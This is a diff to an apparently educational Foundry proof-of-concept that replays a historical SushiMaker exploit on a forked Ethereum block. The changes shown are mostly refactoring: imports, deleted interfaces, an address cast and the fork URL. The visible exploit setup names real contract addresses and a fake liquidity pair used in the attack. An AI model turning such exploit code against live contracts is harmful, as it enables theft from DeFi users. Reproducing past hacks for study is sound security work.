@@ -2,6 +2,8 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import "./interface.sol";
+
 // PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache ¯\_(ツ)_/¯
 /*
 Attack tx: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b
@@ -24,7 +26,7 @@ IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.
 contract Exploit is Test {
     IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
     IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
-    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH private constant WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
     IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
     IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
     ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);
@@ -32,7 +34,7 @@ contract Exploit is Test {
     IUniswapV2Pair private wethPair; // Fake Pair Digg<>WETH
 
     function testHack() external {
-        vm.createSelectFork("https://rpc.builder0x69.io", 11_720_049);
+        vm.createSelectFork(eth, 11_720_049);
 
         IUniswapV2Pair FakePair = createAndProvideLiquidity();
         wethPair = IUniswapV2Pair(address(FakePair));
@@ -104,21 +106,6 @@ contract Exploit is Test {
 }
 
 /* -------------------- Interface -------------------- */
-interface IERC20 {
-    function transfer(address to, uint256 amount) external returns (bool);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-}
-
-interface IWETH {
-    function deposit() external payable;
-    function transfer(address to, uint256 value) external returns (bool);
-    function approve(address guy, uint256 wad) external returns (bool);
-    function withdraw(uint256 wad) external;
-    function balanceOf(address) external view returns (uint256);
-}
-
 interface IUniswapV2Router02 {
     function swapExactTokensForTokens(
         uint256 amountIn,
@@ -150,20 +137,6 @@ interface IUniswapV2Router02 {
     ) external returns (uint256 amountA, uint256 amountB);
 }
 
-interface IUniswapV2Pair {
-    function approve(address spender, uint256 amount) external returns (bool);
-    function balanceOf(address) external view returns (uint256);
-    function skim(address to) external;
-    function sync() external;
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
-
-    function token0() external view returns (address);
-    function token1() external view returns (address);
-}
-
-interface IUniswapV2Factory {
-    function createPair(address tokenA, address tokenB) external returns (address pair);
-}
 
 interface ISushiMaker {
     function convert(address x, address y) external view returns (uint256);
